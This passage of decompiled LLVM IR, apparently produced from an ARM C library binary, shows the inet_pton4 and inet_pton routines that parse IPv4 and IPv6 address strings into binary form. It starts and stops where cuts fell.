
; uselistorder directives
  uselistorder i32 %tmp, { 0, 3, 2, 1 }
  uselistorder i32* null, { 2, 0, 3, 4, 1, 6, 7, 8, 9, 10, 11, 12, 13, 15, 16, 14, 17, 18, 19, 20, 26, 27, 24, 25, 23, 22, 21, 28, 29, 30, 5 }
  uselistorder label %bb13, { 1, 0 }
}

define i32 @inet_pton4(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r1.global-to-local, align 4
  %stack_var_-28 = alloca i32, align 4
  %v3_1aad4 = load i32, i32* @r4, align 4
  %v6_1aad4 = load i32, i32* @r5, align 4
  %v15_1aad4 = load i32, i32* @lr, align 4
  store i32 %arg1, i32* @r4, align 4
  store i32 0, i32* @ip, align 4
  store i32 0, i32* @lr, align 4
  %v2_1aaec = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_1aaec, i32* %r1.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  store i32 10, i32* %r7.global-to-local, align 4
  store i32 1, i32* %r6.global-to-local, align 4
  store i32 0, i32* %stack_var_-28, align 4
  %v0_1ab641 = load i32, i32* @r0, align 4
  %v1_1ab642 = inttoptr i32 %v0_1ab641 to i8*
  %v2_1ab643 = load i8, i8* %v1_1ab642, align 1
  %v3_1ab644 = zext i8 %v2_1ab643 to i32
  store i32 %v3_1ab644, i32* @r3, align 4
  %v2_1ab685 = icmp eq i8 %v2_1ab643, 0
  store i1 %v2_1ab685, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1ab685, label %dec_label_pc_1ab74, label %dec_label_pc_1ab04

dec_label_pc_1ab04:                               ; preds = %entry, %dec_label_pc_1ab64.backedge
  %v0_1ab08 = phi i32 [ %v0_1ab64, %dec_label_pc_1ab64.backedge ], [ %v0_1ab641, %entry ]
  %v0_1ab40 = phi i32 [ %v3_1ab64, %dec_label_pc_1ab64.backedge ], [ %v3_1ab644, %entry ]
  %v2_1ab14.in = phi i32 [ %v3_1ab64, %dec_label_pc_1ab64.backedge ], [ %v3_1ab644, %entry ]
  %v2_1ab14 = add nsw i32 %v2_1ab14.in, -48
  %v2_1ab04 = icmp ugt i32 %v2_1ab14, 8
  %v7_1ab04 = icmp eq i32 %v2_1ab14, 9
  store i1 %v7_1ab04, i1* %cpsr_z.global-to-local, align 1
  %v1_1ab08 = add i32 %v0_1ab08, 1
  store i32 %v1_1ab08, i32* %r0.global-to-local, align 4
  %v2_1ab0c = xor i1 %v7_1ab04, true
  %v3_1ab0c = and i1 %v2_1ab04, %v2_1ab0c
  br i1 %v3_1ab0c, label %dec_label_pc_1ab40, label %dec_label_pc_1ab10

dec_label_pc_1ab10:                               ; preds = %dec_label_pc_1ab04
  %v0_1ab10 = load i32, i32* %r1.global-to-local, align 4
  %v1_1ab10 = inttoptr i32 %v0_1ab10 to i8*
  %v2_1ab10 = load i8, i8* %v1_1ab10, align 1
  %v3_1ab10 = zext i8 %v2_1ab10 to i32
  %v0_1ab14 = load i32, i32* %r7.global-to-local, align 4
  %v3_1ab14 = mul i32 %v0_1ab14, %v3_1ab10
  %v4_1ab14 = add i32 %v3_1ab14, %v2_1ab14
  store i32 %v4_1ab14, i32* @r3, align 4
  %v2_1ab18 = icmp ugt i32 %v4_1ab14, 254
  %v7_1ab18 = icmp eq i32 %v4_1ab14, 255
  store i1 %v7_1ab18, i1* %cpsr_z.global-to-local, align 1
  %v2_1ab1c = xor i1 %v7_1ab18, true
  %v3_1ab1c = and i1 %v2_1ab18, %v2_1ab1c
  br i1 %v3_1ab1c, label %dec_label_pc_1ab98, label %dec_label_pc_1ab20

dec_label_pc_1ab20:                               ; preds = %dec_label_pc_1ab10
  %v0_1ab20 = load i32, i32* @lr, align 4
  %v2_1ab20 = icmp eq i32 %v0_1ab20, 0
  store i1 %v2_1ab20, i1* %cpsr_z.global-to-local, align 1
  %v1_1ab24 = trunc i32 %v4_1ab14 to i8
  store i8 %v1_1ab24, i8* %v1_1ab10, align 1
  %v0_1ab28 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1ab28, label %dec_label_pc_1ab2c, label %dec_label_pc_1ab64.backedge

dec_label_pc_1ab2c:                               ; preds = %dec_label_pc_1ab20
  %v0_1ab2c = load i32, i32* @ip, align 4
  %v1_1ab2c = add i32 %v0_1ab2c, 1
  store i32 %v1_1ab2c, i32* @ip, align 4
  %v7_1ab30 = icmp eq i32 %v1_1ab2c, 4
  store i1 %v7_1ab30, i1* %cpsr_z.global-to-local, align 1
  %v0_1ab34 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_1ab34, i32* @lr, align 4
  %v8_1ab38 = icmp sgt i32 %v1_1ab2c, 4
  br i1 %v8_1ab38, label %dec_label_pc_1ab98, label %dec_label_pc_1ab64.backedge

dec_label_pc_1ab40:                               ; preds = %dec_label_pc_1ab04
  %v7_1ab40 = icmp eq i32 %v0_1ab40, 46
  %v1_1ab48 = load i32, i32* @lr, align 4
  %v2_1ab48 = urem i32 %v1_1ab48, 2
  %storemerge12 = select i1 %v7_1ab40, i32 %v2_1ab48, i32 0
  store i32 %storemerge12, i32* @r3, align 4
  %v2_1ab4c = icmp eq i32 %storemerge12, 0
  store i1 %v2_1ab4c, i1* %cpsr_z.global-to-local, align 1
  %v0_1ab50 = load i32, i32* @r5, align 4
  store i32 %v0_1ab50, i32* @lr, align 4
  br i1 %v2_1ab4c, label %dec_label_pc_1ab98, label %dec_label_pc_1ab58

dec_label_pc_1ab58:                               ; preds = %dec_label_pc_1ab40
  %v0_1ab58 = load i32, i32* @ip, align 4
  %v7_1ab58 = icmp eq i32 %v0_1ab58, 4
  store i1 %v7_1ab58, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1ab58, label %dec_label_pc_1ab98, label %dec_label_pc_1ab60

dec_label_pc_1ab60:                               ; preds = %dec_label_pc_1ab58
  %v1_1ab60 = trunc i32 %v0_1ab50 to i8
  %v2_1ab60 = load i32, i32* %r1.global-to-local, align 4
  %v3_1ab60 = add i32 %v2_1ab60, 1
  %v4_1ab60 = inttoptr i32 %v3_1ab60 to i8*
  store i8 %v1_1ab60, i8* %v4_1ab60, align 1
  %v5_1ab60 = load i32, i32* %r1.global-to-local, align 4
  %v6_1ab60 = add i32 %v5_1ab60, 1
  store i32 %v6_1ab60, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1ab64.backedge

dec_label_pc_1ab64.backedge:                      ; preds = %dec_label_pc_1ab60, %dec_label_pc_1ab20, %dec_label_pc_1ab2c
  %v0_1ab64 = load i32, i32* %r0.global-to-local, align 4
  %v1_1ab64 = inttoptr i32 %v0_1ab64 to i8*
  %v2_1ab64 = load i8, i8* %v1_1ab64, align 1
  %v3_1ab64 = zext i8 %v2_1ab64 to i32
  store i32 %v3_1ab64, i32* @r3, align 4
  %v2_1ab68 = icmp eq i8 %v2_1ab64, 0
  store i1 %v2_1ab68, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1ab68, label %dec_label_pc_1ab64.dec_label_pc_1ab74_crit_edge, label %dec_label_pc_1ab04

dec_label_pc_1ab64.dec_label_pc_1ab74_crit_edge:  ; preds = %dec_label_pc_1ab64.backedge
  %v0_1ab74.pre = load i32, i32* @ip, align 4
  br label %dec_label_pc_1ab74

dec_label_pc_1ab74:                               ; preds = %dec_label_pc_1ab64.dec_label_pc_1ab74_crit_edge, %entry
  %v0_1ab74 = phi i32 [ %v0_1ab74.pre, %dec_label_pc_1ab64.dec_label_pc_1ab74_crit_edge ], [ 0, %entry ]
  %v7_1ab74 = icmp eq i32 %v0_1ab74, 3
  store i1 %v7_1ab74, i1* %cpsr_z.global-to-local, align 1
  %v7_1ab78 = icmp slt i32 %v0_1ab74, 4
  br i1 %v7_1ab78, label %dec_label_pc_1ab98, label %dec_label_pc_1ab7c

dec_label_pc_1ab7c:                               ; preds = %dec_label_pc_1ab74
  %v0_1ab7c = load i32, i32* @r4, align 4
  store i32 %v0_1ab7c, i32* @r0, align 4
  store i32 %v2_1aaec, i32* @r1, align 4
  store i32 4, i32* @r2, align 4
  %v0_1ab88 = call i32 @memcpy()
  br label %dec_label_pc_1ab98

dec_label_pc_1ab98:                               ; preds = %dec_label_pc_1ab10, %dec_label_pc_1ab2c, %dec_label_pc_1ab40, %dec_label_pc_1ab58, %dec_label_pc_1ab74, %dec_label_pc_1ab7c
  %storemerge = phi i32 [ 1, %dec_label_pc_1ab7c ], [ 0, %dec_label_pc_1ab74 ], [ 0, %dec_label_pc_1ab58 ], [ 0, %dec_label_pc_1ab40 ], [ 0, %dec_label_pc_1ab2c ], [ 0, %dec_label_pc_1ab10 ]
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  store i32 %v3_1aad4, i32* @r4, align 4
  store i32 %v6_1aad4, i32* @r5, align 4
  store i32 %v15_1aad4, i32* @lr, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v0_1ab74, { 1, 0 }
  uselistorder i32 %v3_1ab64, { 2, 1, 0 }
  uselistorder i32 %v0_1ab64, { 1, 0 }
  uselistorder i32 %storemerge12, { 1, 0 }
  uselistorder i32 %v2_1ab14, { 2, 0, 1 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 9, 2, 3, 4, 5, 6, 7, 8, 0 }
  uselistorder label %dec_label_pc_1ab98, { 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_1ab64.backedge, { 0, 2, 1 }
  uselistorder label %dec_label_pc_1ab04, { 1, 0 }
}

define i32 @inet_pton(i32 %arg1, i8* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i8* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %v3_1aba4 = load i32, i32* @r4, align 4
  %v6_1aba4 = load i32, i32* @r5, align 4
  %v9_1aba4 = load i32, i32* @r6, align 4
  %v12_1aba4 = load i32, i32* @r7, align 4
  %v27_1aba4 = load i32, i32* @lr, align 4
  %v7_1abb0 = icmp eq i32 %arg1, 2
  store i32 ptrtoint (i32* @global_var_28010.981 to i32), i32* @r4, align 4
  store i32 %tmp, i32* @r5, align 4
  br i1 %v7_1abb0, label %dec_label_pc_1abd0, label %dec_label_pc_1abc4

dec_label_pc_1abc4:                               ; preds = %entry
  %v7_1abc4 = icmp eq i32 %arg1, 10
  br i1 %v7_1abc4, label %dec_label_pc_1abe0, label %dec_label_pc_1ad98

dec_label_pc_1abd0:                               ; preds = %entry
  store i32 %tmp, i32* @r0, align 4
  store i32 %arg3, i32* %r1.global-to-local, align 4
  %v3_1abd8 = call i32 @inet_pton4(i32 %tmp, i32 %arg3)
  br label %dec_label_pc_1ada8

dec_label_pc_1abe0:                               ; preds = %dec_label_pc_1abc4
  %v2_1abe0 = ptrtoint i32* %stack_var_-56 to i32
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 16, i32* @r2, align 4
  %v2_1abec = bitcast i32* %stack_var_-56 to i8*
  %v3_1abec = call i32 @__GI_memset(i8* %v2_1abec, i32 0)
  %v0_1abf0 = load i32, i32* @r5, align 4
  %v1_1abf0 = inttoptr i32 %v0_1abf0 to i8*
  %v2_1abf0 = load i8, i8* %v1_1abf0, align 1
  %v3_1abf0 = zext i8 %v2_1abf0 to i32
  store i32 %v3_1abf0, i32* %r3.global-to-local, align 4
  %v7_1abf4 = icmp eq i8 %v2_1abf0, 58
  store i32 %v3_1abec, i32* @r6, align 4
  %v2_1abfc = add i32 %v3_1abec, 16
  store i32 %v2_1abfc, i32* %r8.global-to-local, align 4
  br i1 %v7_1abf4, label %dec_label_pc_1ac04, label %dec_label_pc_1ac10

dec_label_pc_1ac04:                               ; preds = %dec_label_pc_1abe0
  %v1_1ac04 = add i32 %v0_1abf0, 1
  %v2_1ac04 = inttoptr i32 %v1_1ac04 to i8*
  %v3_1ac04 = load i8, i8* %v2_1ac04, align 1
  %v4_1ac04 = zext i8 %v3_1ac04 to i32
  store i32 %v4_1ac04, i32* %r3.global-to-local, align 4
  store i32 %v1_1ac04, i32* @r5, align 4
  %v7_1ac08 = icmp eq i8 %v3_1ac04, 58
  br i1 %v7_1ac08, label %dec_label_pc_1ac10, label %dec_label_pc_1ad90

dec_label_pc_1ac10:                               ; preds = %dec_label_pc_1ac04, %dec_label_pc_1abe0
  %v0_1ac1c = phi i32 [ %v1_1ac04, %dec_label_pc_1ac04 ], [ %v0_1abf0, %dec_label_pc_1abe0 ]
  store i32 -1324, i32* @r3, align 4
  store i32 0, i32* %fp.global-to-local, align 4
  %v0_1ac18 = load i32, i32* @r4, align 4
  %v2_1ac18 = add i32 %v0_1ac18, -1324
  store i32 %v0_1ac1c, i32* %sl.global-to-local, align 4
  store i32 0, i32* %sb.global-to-local, align 4
  store i32 0, i32* @r7, align 4
  store i32 %v2_1ac18, i32* %stack_var_-64, align 4
  %v1_1acf43 = inttoptr i32 %v0_1ac1c to i8*
  %v2_1acf44 = load i8, i8* %v1_1acf43, align 1
  %v3_1acf45 = zext i8 %v2_1acf44 to i32
  store i32 %v3_1acf45, i32* @r4, align 4
  %v2_1acf86 = icmp eq i8 %v2_1acf44, 0
  br i1 %v2_1acf86, label %dec_label_pc_1ad00.thread, label %dec_label_pc_1ac30

dec_label_pc_1ad00.thread:                        ; preds = %dec_label_pc_1ac10
  store i32 %v3_1abec, i32* @r4, align 4
  br label %dec_label_pc_1ad2c

dec_label_pc_1ac30:                               ; preds = %dec_label_pc_1ac10, %dec_label_pc_1acf4.backedge.dec_label_pc_1ac30_crit_edge
  %v0_1ac34 = phi i32 [ %v3_1acf4, %dec_label_pc_1acf4.backedge.dec_label_pc_1ac30_crit_edge ], [ %v3_1acf45, %dec_label_pc_1ac10 ]
  %v2_1ac30 = phi i32 [ %v2_1ac30.pre, %dec_label_pc_1acf4.backedge.dec_label_pc_1ac30_crit_edge ], [ %v2_1ac18, %dec_label_pc_1ac10 ]
  store i32 %v2_1ac30, i32* @r0, align 4
  %v1_1ac34 = or i32 %v0_1ac34, 32
  store i32 %v1_1ac34, i32* %r1.global-to-local, align 4
  %v2_1ac38 = call i32 @__GI_strchr(i32 %v2_1ac30, i32 %v1_1ac34)
  %v2_1ac3c = icmp eq i32 %v2_1ac38, 0
  %v0_1ac40 = load i32, i32* @r5, align 4
  %v1_1ac40 = add i32 %v0_1ac40, 1
  store i32 %v1_1ac40, i32* @r5, align 4
  br i1 %v2_1ac3c, label %dec_label_pc_1ac64, label %dec_label_pc_1ac48

dec_label_pc_1ac48:                               ; preds = %dec_label_pc_1ac30
  %v2_1ac48 = load i32, i32* %stack_var_-64, align 4
  store i32 %v2_1ac48, i32* %r2.global-to-local, align 4
  %v2_1ac4c = sub i32 %v2_1ac38, %v2_1ac48
  %v1_1ac50 = load i32, i32* @r7, align 4
  %v4_1ac50 = mul i32 %v1_1ac50, 16
  %v5_1ac50 = or i32 %v4_1ac50, %v2_1ac4c
  store i32 %v5_1ac50, i32* @r7, align 4
  store i32 65535, i32* @r3, align 4
  %tmp36 = icmp ult i32 %v5_1ac50, 65536
  br i1 %tmp36, label %dec_label_pc_1acf0, label %dec_label_pc_1ad90

dec_label_pc_1ac64:                               ; preds = %dec_label_pc_1ac30
  %v0_1ac64 = load i32, i32* @r4, align 4
  %v7_1ac64 = icmp eq i32 %v0_1ac64, 58
  br i1 %v7_1ac64, label %dec_label_pc_1ac6c, label %dec_label_pc_1acc4

dec_label_pc_1ac6c:                               ; preds = %dec_label_pc_1ac64
  %v0_1ac6c = load i32, i32* %sb.global-to-local, align 4
  %v2_1ac6c = icmp eq i32 %v0_1ac6c, 0
  br i1 %v2_1ac6c, label %dec_label_pc_1ac74, label %dec_label_pc_1ac88

dec_label_pc_1ac74:                               ; preds = %dec_label_pc_1ac6c
  %v0_1ac74 = load i32, i32* %fp.global-to-local, align 4
  %v2_1ac74 = icmp eq i32 %v0_1ac74, 0
  br i1 %v2_1ac74, label %dec_label_pc_1ac7c, label %dec_label_pc_1ad90

dec_label_pc_1ac7c:                               ; preds = %dec_label_pc_1ac74
  %v0_1ac7c = load i32, i32* @r6, align 4
  store i32 %v0_1ac7c, i32* %fp.global-to-local, align 4
  store i32 %v1_1ac40, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_1acf4.backedge

dec_label_pc_1ac88:                               ; preds = %dec_label_pc_1ac6c
  %v1_1ac88 = inttoptr i32 %v1_1ac40 to i8*
  %v2_1ac88 = load i8, i8* %v1_1ac88, align 1
  %v3_1ac88 = zext i8 %v2_1ac88 to i32
  store i32 %v3_1ac88, i32* %r3.global-to-local, align 4
  %v2_1ac8c = icmp eq i8 %v2_1ac88, 0
  br i1 %v2_1ac8c, label %dec_label_pc_1ad90, label %dec_label_pc_1ac94

dec_label_pc_1ac94:                               ; preds = %dec_label_pc_1ac88
  %v0_1ac94 = load i32, i32* @r6, align 4
  %v1_1ac94 = add i32 %v0_1ac94, 2
  store i32 %v1_1ac94, i32* %r3.global-to-local, align 4
  %v1_1ac98 = load i32, i32* %r8.global-to-local, align 4
  %tmp37 = icmp ugt i32 %v1_1ac94, %v1_1ac98
  br i1 %tmp37, label %dec_label_pc_1ad90, label %dec_label_pc_1aca0

dec_label_pc_1aca0:                               ; preds = %dec_label_pc_1ac94
  %v0_1aca0 = load i32, i32* @r7, align 4
  %v3_1aca0 = udiv i32 %v0_1aca0, 256
  store i32 %v3_1aca0, i32* %r2.global-to-local, align 4
  store i32 %v0_1ac94, i32* %r3.global-to-local, align 4
  %v1_1aca8 = trunc i32 %v3_1aca0 to i8
  %v3_1aca8 = inttoptr i32 %v0_1ac94 to i8*
  store i8 %v1_1aca8, i8* %v3_1aca8, align 1
  %v4_1aca8 = load i32, i32* %r3.global-to-local, align 4
  %v5_1aca8 = add i32 %v4_1aca8, 1
  store i32 %v5_1aca8, i32* @r3, align 4
  %v0_1acac = load i32, i32* @r7, align 4
  %v1_1acac = trunc i32 %v0_1acac to i8
  %v2_1acac = load i32, i32* @r6, align 4
  %v3_1acac = add i32 %v2_1acac, 1
  %v4_1acac = inttoptr i32 %v3_1acac to i8*
  store i8 %v1_1acac, i8* %v4_1acac, align 1
  store i32 0, i32* @r7, align 4
  %v0_1acb4 = load i32, i32* @r3, align 4
  %v1_1acb4 = add i32 %v0_1acb4, 1
  store i32 %v1_1acb4, i32* @r6, align 4
  %v0_1acb8 = load i32, i32* @r5, align 4
  store i32 %v0_1acb8, i32* %sl.global-to-local, align 4
  store i32 0, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_1acf4.backedge

dec_label_pc_1acc4:                               ; preds = %dec_label_pc_1ac64
  %v7_1acc4 = icmp eq i32 %v0_1ac64, 46
  br i1 %v7_1acc4, label %dec_label_pc_1accc, label %dec_label_pc_1ad90

dec_label_pc_1accc:                               ; preds = %dec_label_pc_1acc4
  %v0_1accc = load i32, i32* @r6, align 4
  %v1_1accc = add i32 %v0_1accc, 4
  store i32 %v1_1accc, i32* @r4, align 4
  %v1_1acd0 = load i32, i32* %r8.global-to-local, align 4
  %tmp38 = icmp ugt i32 %v1_1accc, %v1_1acd0
  br i1 %tmp38, label %dec_label_pc_1ad90, label %dec_label_pc_1acd8

dec_label_pc_1acd8:                               ; preds = %dec_label_pc_1accc
  %v0_1acd8 = load i32, i32* %sl.global-to-local, align 4
  store i32 %v0_1acd8, i32* @r0, align 4
  store i32 %v0_1accc, i32* %r1.global-to-local, align 4
  %v3_1ace0 = call i32 @inet_pton4(i32 %v0_1acd8, i32 %v0_1accc)
  %v5_1ace8 = icmp sgt i32 %v3_1ace0, 0
  br i1 %v5_1ace8, label %dec_label_pc_1acd8.dec_label_pc_1ad2c_crit_edge, label %dec_label_pc_1ad90

dec_label_pc_1acd8.dec_label_pc_1ad2c_crit_edge:  ; preds = %dec_label_pc_1acd8
  %v0_1ad70.pre.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_1ad2c

dec_label_pc_1acf0:                               ; preds = %dec_label_pc_1ac48
  store i32 1, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_1acf4.backedge

dec_label_pc_1acf4.backedge:                      ; preds = %dec_label_pc_1acf0, %dec_label_pc_1ac7c, %dec_label_pc_1aca0
  %v0_1acf4 = phi i32 [ %v1_1ac40, %dec_label_pc_1acf0 ], [ %v1_1ac40, %dec_label_pc_1ac7c ], [ %v0_1acb8, %dec_label_pc_1aca0 ]
  %v0_1ad0012 = phi i32 [ 1, %dec_label_pc_1acf0 ], [ 0, %dec_label_pc_1ac7c ], [ 0, %dec_label_pc_1aca0 ]
  %v1_1acf4 = inttoptr i32 %v0_1acf4 to i8*
  %v2_1acf4 = load i8, i8* %v1_1acf4, align 1
  %v3_1acf4 = zext i8 %v2_1acf4 to i32
  store i32 %v3_1acf4, i32* @r4, align 4
  %v2_1acf8 = icmp eq i8 %v2_1acf4, 0
  br i1 %v2_1acf8, label %dec_label_pc_1ad00, label %dec_label_pc_1acf4.backedge.dec_label_pc_1ac30_crit_edge

dec_label_pc_1acf4.backedge.dec_label_pc_1ac30_crit_edge: ; preds = %dec_label_pc_1acf4.backedge
  %v2_1ac30.pre = load i32, i32* %stack_var_-64, align 4
  br label %dec_label_pc_1ac30

dec_label_pc_1ad00:                               ; preds = %dec_label_pc_1acf4.backedge
  %v0_1ad04.pre = load i32, i32* @r6, align 4
  %v2_1ad00 = icmp eq i32 %v0_1ad0012, 0
  store i32 %v0_1ad04.pre, i32* @r4, align 4
  br i1 %v2_1ad00, label %dec_label_pc_1ad2c, label %dec_label_pc_1ad0c

dec_label_pc_1ad0c:                               ; preds = %dec_label_pc_1ad00
  %v1_1ad0c = add i32 %v0_1ad04.pre, 2
  store i32 %v1_1ad0c, i32* %r3.global-to-local, align 4
  %v1_1ad10 = load i32, i32* %r8.global-to-local, align 4
  %tmp39 = icmp ugt i32 %v1_1ad0c, %v1_1ad10
  br i1 %tmp39, label %dec_label_pc_1ad90, label %dec_label_pc_1ad18

dec_label_pc_1ad18:                               ; preds = %dec_label_pc_1ad0c
  store i32 %v0_1ad04.pre, i32* %r3.global-to-local, align 4
  %v0_1ad1c = load i32, i32* @r7, align 4
  %v3_1ad1c = udiv i32 %v0_1ad1c, 256
  store i32 %v3_1ad1c, i32* %r2.global-to-local, align 4
  %v1_1ad20 = trunc i32 %v3_1ad1c to i8
  %v3_1ad20 = inttoptr i32 %v0_1ad04.pre to i8*
  store i8 %v1_1ad20, i8* %v3_1ad20, align 1
  %v4_1ad20 = load i32, i32* %r3.global-to-local, align 4
  %v5_1ad20 = add i32 %v4_1ad20, 1
  store i32 %v5_1ad20, i32* @r3, align 4
  %v0_1ad24 = load i32, i32* @r7, align 4
  %v1_1ad24 = trunc i32 %v0_1ad24 to i8
  %v2_1ad24 = load i32, i32* @r6, align 4
  %v3_1ad24 = add i32 %v2_1ad24, 1
  %v4_1ad24 = inttoptr i32 %v3_1ad24 to i8*
  store i8 %v1_1ad24, i8* %v4_1ad24, align 1
  %v0_1ad28 = load i32, i32* @r3, align 4
  %v1_1ad28 = add i32 %v0_1ad28, 1
  store i32 %v1_1ad28, i32* @r4, align 4
  br label %dec_label_pc_1ad2c

dec_label_pc_1ad2c:                               ; preds = %dec_label_pc_1acd8.dec_label_pc_1ad2c_crit_edge, %dec_label_pc_1ad00.thread, %dec_label_pc_1ad00, %dec_label_pc_1ad18
  %v0_1ad70.pre = phi i32 [ %v0_1ad70.pre.pre, %dec_label_pc_1acd8.dec_label_pc_1ad2c_crit_edge ], [ %v3_1abec, %dec_label_pc_1ad00.thread ], [ %v0_1ad04.pre, %dec_label_pc_1ad00 ], [ %v1_1ad28, %dec_label_pc_1ad18 ]
  %v0_1ad2c = load i32, i32* %fp.global-to-local, align 4
  %v2_1ad2c = icmp eq i32 %v0_1ad2c, 0
  %v1_1ad70.pre = load i32, i32* %r8.global-to-local, align 4
  br i1 %v2_1ad2c, label %dec_label_pc_1ad70, label %dec_label_pc_1ad34

dec_label_pc_1ad34:                               ; preds = %dec_label_pc_1ad2c
  %v9_1ad34 = icmp eq i32 %v0_1ad70.pre, %v1_1ad70.pre
  %v2_1ad38 = sub i32 %v0_1ad70.pre, %v0_1ad2c
  store i32 %v2_1ad38, i32* @ip, align 4
  br i1 %v9_1ad34, label %dec_label_pc_1ad90, label %dec_label_pc_1ad58.preheader

dec_label_pc_1ad58.preheader:                     ; preds = %dec_label_pc_1ad34
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* @lr, align 4
  br label %dec_label_pc_1ad58

dec_label_pc_1ad4c:                               ; preds = %dec_label_pc_1ad58
  %v2_1ad60 = sub i32 %v0_1ad6c, %v0_1ad64
  %v0_1ad4c = load i32, i32* %fp.global-to-local, align 4
  %v2_1ad4c = add i32 %v0_1ad4c, %v2_1ad5c
  %v3_1ad4c = inttoptr i32 %v2_1ad4c to i8*
  %v4_1ad4c = load i8, i8* %v3_1ad4c, align 1
  %v6_1ad4c = zext i8 %v4_1ad4c to i32
  store i32 %v6_1ad4c, i32* @r3, align 4
  %v3_1ad50 = inttoptr i32 %v2_1ad60 to i8*
  store i8 %v4_1ad4c, i8* %v3_1ad50, align 1
  %v0_1ad54 = load i32, i32* @lr, align 4
  %v1_1ad54 = trunc i32 %v0_1ad54 to i8
  %v2_1ad54 = load i32, i32* %fp.global-to-local, align 4
  %v3_1ad54 = load i32, i32* %r1.global-to-local, align 4
  %v4_1ad54 = add i32 %v3_1ad54, %v2_1ad54
  %v5_1ad54 = inttoptr i32 %v4_1ad54 to i8*
  store i8 %v1_1ad54, i8* %v5_1ad54, align 1
  %v0_1ad58.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_1ad58.pre = load i32, i32* @ip, align 4
  %v1_1ad60.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_1ad58

dec_label_pc_1ad58:                               ; preds = %dec_label_pc_1ad58.preheader, %dec_label_pc_1ad4c
  %v0_1ad6c = phi i32 [ %v1_1ad70.pre, %dec_label_pc_1ad58.preheader ], [ %v1_1ad60.pre, %dec_label_pc_1ad4c ]
  %v1_1ad5c = phi i32 [ %v2_1ad38, %dec_label_pc_1ad58.preheader ], [ %v1_1ad58.pre, %dec_label_pc_1ad4c ]
  %v0_1ad64 = phi i32 [ 1, %dec_label_pc_1ad58.preheader ], [ %v0_1ad58.pre, %dec_label_pc_1ad4c ]
  %v2_1ad58 = sub i32 %v0_1ad64, %v1_1ad5c
  %v4_1ad58 = xor i32 %v0_1ad64, %v1_1ad5c
  %v5_1ad58 = xor i32 %v2_1ad58, %v0_1ad64
  %v6_1ad58 = and i32 %v5_1ad58, %v4_1ad58
  %v7_1ad58 = icmp slt i32 %v6_1ad58, 0
  %v8_1ad58 = icmp slt i32 %v2_1ad58, 0
  %v9_1ad58 = icmp eq i32 %v0_1ad64, %v1_1ad5c
  %v2_1ad5c = sub i32 %v1_1ad5c, %v0_1ad64
  store i32 %v2_1ad5c, i32* %r1.global-to-local, align 4
  %v1_1ad64 = add i32 %v0_1ad64, 1
  store i32 %v1_1ad64, i32* %r2.global-to-local, align 4
  %v3_1ad68 = xor i1 %v8_1ad58, %v7_1ad58
  %v4_1ad68 = or i1 %v9_1ad58, %v3_1ad68
  br i1 %v4_1ad68, label %dec_label_pc_1ad4c, label %dec_label_pc_1ad6c

dec_label_pc_1ad6c:                               ; preds = %dec_label_pc_1ad58
  store i32 %v0_1ad6c, i32* @r4, align 4
  br label %dec_label_pc_1ad70

dec_label_pc_1ad70:                               ; preds = %dec_label_pc_1ad2c, %dec_label_pc_1ad6c
  %v0_1ad70 = phi i32 [ %v0_1ad6c, %dec_label_pc_1ad6c ], [ %v0_1ad70.pre, %dec_label_pc_1ad2c ]
  %v1_1ad70 = phi i32 [ %v0_1ad6c, %dec_label_pc_1ad6c ], [ %v1_1ad70.pre, %dec_label_pc_1ad2c ]
  %v9_1ad70 = icmp eq i32 %v0_1ad70, %v1_1ad70
  br i1 %v9_1ad70, label %dec_label_pc_1ad78, label %dec_label_pc_1ad90

dec_label_pc_1ad78:                               ; preds = %dec_label_pc_1ad70
  store i32 %arg3, i32* @r0, align 4
  store i32 %v2_1abe0, i32* @r1, align 4
  store i32 16, i32* @r2, align 4
  %v0_1ad84 = call i32 @memcpy()
  br label %dec_label_pc_1ada8

dec_label_pc_1ad90:                               ; preds = %dec_label_pc_1ac48, %dec_label_pc_1ac74, %dec_label_pc_1ac94, %dec_label_pc_1ac88, %dec_label_pc_1ad34, %dec_label_pc_1acd8, %dec_label_pc_1acc4, %dec_label_pc_1ad70, %dec_label_pc_1ac04, %dec_label_pc_1ad0c, %dec_label_pc_1accc
  br label %dec_label_pc_1ada8

dec_label_pc_1ad98:                               ; preds = %dec_label_pc_1abc4
  %v0_1ad98 = call i32 @__GI___errno_location()
  store i32 97, i32* %r3.global-to-local, align 4
  %v2_1ada0 = inttoptr i32 %v0_1ad98 to i32*
  store i32 97, i32* %v2_1ada0, align 4
  br label %dec_label_pc_1ada8

